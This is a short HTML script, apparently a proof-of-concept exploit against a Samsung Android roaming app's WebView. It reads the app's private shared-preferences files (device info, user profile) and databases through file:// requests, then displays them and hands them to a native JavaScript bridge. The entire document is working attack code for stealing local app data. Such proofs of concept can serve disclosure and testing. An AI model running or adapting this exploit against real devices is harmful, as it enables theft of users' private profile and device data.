<script>

function sendGetRequest(url, filename, callback) {
    var xhr = new XMLHttpRequest();
    console.log('xhr: ' + xhr);
    xhr.open('GET', url, false);
    xhr.send();
    callback(filename, xhr.responseText);
}

var files = Array(
    'shared_prefs/Param.xml',
    'shared_prefs/info.xml',
    'shared_prefs/DeviceInfo.xml',
    'shared_prefs/UserProfile.xml',
    'app_database/xUtils.db',
    'databases/ua.db'
);
var base_path = 'file:///data/data/com.samsung.android.globalroaming/';

for(var each in files) {
    var file_path = base_path + files[each];
    var idx = Number(each) + 1;
    console.log("p"+idx);
    console.log('file_path: ' + file_path);
    var callback = function(filename, response) {
        alert(filename + ":\n\n" + response);        
        document.getElementById("p"+idx).innerHTML=response;
        secCallbackInterface.tapPreOrderProduct(response);
    }
    sendGetRequest(file_path, files[each], callback);
}

</script>
